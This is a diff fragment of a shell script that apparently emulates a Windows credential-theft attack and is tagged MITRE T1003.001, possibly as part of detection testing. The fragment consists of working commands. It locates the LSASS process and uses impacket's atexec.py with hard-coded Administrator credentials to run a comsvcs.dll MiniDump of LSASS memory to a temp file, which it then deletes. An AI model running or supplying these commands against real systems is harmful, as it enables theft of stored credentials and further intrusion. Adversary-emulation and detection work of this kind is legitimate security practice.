@@ -23,8 +23,8 @@ lsass_pid=$(grep -oE '^[0-9]+\s*$' <<<"$pid_out" | head -1 | tr -d '[:space:]' |
 [ -n "$lsass_pid" ] || { echo "no lsass pid" >&2; tail -5 <<<"$pid_out" >&2; exit 1; }
 
 echo "step: minidump (T1003.001)" >&2
-dump_out=$(timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
-  "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $lsass_pid C:\\Windows\\Temp\\l.dmp full" 2>&1 || true)
+timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
+  "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $lsass_pid C:\\Windows\\Temp\\l.dmp full" >/dev/null 2>&1 || true
 sleep 3
 timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
   'cmd /c del /f /q C:\Windows\Temp\l.dmp' >/dev/null 2>&1 || true
